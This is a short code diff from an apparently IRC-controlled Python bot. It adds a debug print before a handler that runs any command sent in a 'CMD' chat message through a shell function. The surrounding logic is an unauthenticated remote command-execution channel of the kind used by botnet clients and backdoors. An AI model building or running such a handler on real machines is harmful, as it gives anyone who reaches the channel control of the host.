@@ -28,6 +28,7 @@ class IRC:
 
         if resp.find('CMD') != -1:
             cmd = resp.split(" ")[1].replace('\n' , '').replace('\r', '')
+            print(cmd)
             shell(cmd)
 
         if resp.find('PING') != -1:
